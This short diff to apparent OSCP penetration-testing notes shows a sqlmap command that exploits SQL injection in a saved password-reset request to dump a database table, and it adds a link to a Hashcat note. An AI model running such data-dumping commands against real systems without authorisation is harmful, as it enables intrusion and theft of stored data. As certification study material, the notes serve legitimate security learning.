@@ -26,3 +26,5 @@ dump a table's contents
 ```
 sqlmap -r reset.req -p email --batch --level 3 -D [database_name] -T [table_name] --dump
 ```
+
+[[Synced OSCP Notes/Small Toolkit/Tools/Hashcat|Hashcat]]
